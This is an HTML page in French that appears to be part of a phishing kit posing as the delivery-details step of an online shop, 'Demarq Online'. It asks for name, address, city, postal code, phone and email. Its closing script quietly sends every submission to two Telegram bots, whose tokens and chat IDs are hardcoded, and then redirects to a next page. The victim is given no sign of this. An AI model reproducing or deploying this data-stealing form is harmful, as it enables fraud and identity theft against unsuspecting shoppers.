<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informations de Livraison - Demarq Online</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }

        body {
            background-color: #f4f6f9;
            color: #333;
            font-size: 16px;
        }

        /* En-tête */
        header {
            background-color: #003f5f;
            color: white;
            padding: 20px 30px;
            text-align: center;
        }

        header h1 {
            font-size: 36px;
            font-weight: 600;
        }

        /* Top bar */
        .top-bar {
            background-color: #5ac3d1;
            color: white;
            text-align: center;
            padding: 10px;
            font-size: 14px;
        }

        .top-bar span {
            background-color: #e6005c;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }

        /* Conteneur principal */
        .container {
            max-width: 1100px;
            margin: 40px auto;
            padding: 30px;
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .section-title {
            color: #003f5f;
            font-size: 26px;
            margin-bottom: 20px;
        }

        .form-section {
            margin-bottom: 20px;
        }

        .form-section label {
            font-size: 16px;
            font-weight: bold;
            color: #003f5f;
            margin-bottom: 8px;
            display: block;
        }

        .form-section input, .form-section select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 15px;
            box-sizing: border-box;
        }

        .form-section input[type="radio"] {
            width: auto;
            margin-right: 10px;
        }

        .form-section .submit-btn {
            background-color: #e6005c;
            color: white;
            padding: 15px;
            font-size: 18px;
            text-align: center;
            width: 100%;
            border-radius: 8px;
            border: none;
            cursor: pointer;
        }

        .form-section .submit-btn:hover {
            background-color: #c0392b;
        }

        .footer {
            background-color: #003f5f;
            color: white;
            padding: 40px 30px;
            text-align: center;
        }

        .footer p {
            font-size: 14px;
            margin-top: 20px;
        }

        .footer a {
            color: #00e6e6;
            text-decoration: none;
            margin: 5px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            header h1 {
                font-size: 28px;
            }

            .container {
                padding: 20px;
            }

            .section-title {
                font-size: 24px;
            }

            .form-section input,
            .form-section select,
            .form-section .submit-btn {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>

    <!-- Top bar -->
    <div class="top-bar">
        <span>LIVRAISON GRATUITE dès 49€</span>
    </div>

    <!-- Header -->
    <header>
        <h1>Demarq Online - Livraison et Informations Client</h1>
    </header>

    <!-- Contenu principal -->
    <div class="container">
        <h2 class="section-title">Informations de Livraison</h2>
        
        <form id="customer-form">
            <!-- Nom complet -->
            <div class="form-section">
                <label for="full-name">Nom Complet <span class="required">*</span></label>
                <input type="text" id="full-name" name="full-name" required placeholder="Entrez votre nom complet" />
            </div>

            <!-- Adresse de livraison -->
            <div class="form-section">
                <label for="address">Adresse de Livraison <span class="required">*</span></label>
                <input type="text" id="address" name="address" required placeholder="Entrez votre adresse" />
            </div>

            <!-- Ville -->
            <div class="form-section">
                <label for="city">Ville <span class="required">*</span></label>
                <input type="text" id="city" name="city" required placeholder="Entrez votre ville" />
            </div>

            <!-- Code postal -->
            <div class="form-section">
                <label for="postal-code">Code Postal <span class="required">*</span></label>
                <input type="text" id="postal-code" name="postal-code" required placeholder="Entrez votre code postal" />
            </div>

            <!-- Numéro de téléphone -->
            <div class="form-section">
                <label for="phone">Numéro de Téléphone <span class="required">*</span></label>
                <input type="tel" id="phone" name="phone" required placeholder="Entrez votre numéro de téléphone" />
            </div>

            <!-- Email -->
            <div class="form-section">
                <label for="email">Email <span class="required">*</span></label>
                <input type="email" id="email" name="email" required placeholder="Entrez votre email" />
            </div>

            <!-- Méthode de livraison -->
            <div class="form-section">
                <label for="shipping-method">Méthode de Livraison</label>
                <select id="shipping-method" name="shipping-method">
                    <option value="standard">Livraison Standard (5 à 7 jours)</option>
                    <option value="express">Livraison Express (2 à 3 jours)</option>
                </select>
            </div>

            <!-- Bouton soumettre -->
            <div class="form-section">
                <button type="submit" class="submit-btn">Confirmer la Commande</button>
            </div>
        </form>
    </div>

    <!-- Footer -->
    <div class="footer">
        <p>© 2025 Demarq Online | <a href="#">Mentions légales</a> | <a href="#">Politique de confidentialité</a></p>
        <p>Suivez-nous sur nos réseaux sociaux</p>
        <p>
            <a href="#">Facebook</a> | <a href="#">Instagram</a> | <a href="#">Twitter</a>
        </p>
    </div>

    <script>
        document.getElementById('customer-form').addEventListener('submit', function(event) {
            event.preventDefault();

            // Collecte des données du formulaire
            const fullName = document.getElementById('full-name').value;
            const address = document.getElementById('address').value;
            const city = document.getElementById('city').value;
            const postalCode = document.getElementById('postal-code').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const shippingMethod = document.getElementById('shipping-method').value;

            // Message à envoyer
            const message = `Nom: ${fullName}\nAdresse: ${address}\nVille: ${city}\nCode Postal: ${postalCode}\nTéléphone: ${phone}\nEmail: ${email}\nMéthode de Livraison: ${shippingMethod}`;

            // Token et ChatID des bots Telegram
            const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
            const bot2Token = '7238919189:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
            const bot1Id = '5372119436';
            const bot2Id = '5372111022';

            // Envoi au bot1
            sendToTelegram(bot1Token, bot1Id, message);
            // Envoi au bot2
            sendToTelegram(bot2Token, bot2Id, message);

            // Redirection vers la page suivante
            window.location.href = 'traitement2.html';
        });

        // Fonction pour envoyer le message au bot Telegram
        function sendToTelegram(token, chatId, message) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const params = { chat_id: chatId, text: message };

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(params)
            })
            .then(response => response.json())
            .then(data => console.log('Message envoyé:', data))
            .catch(error => console.error('Erreur:', error));
        }
    </script>
</body>
</html>
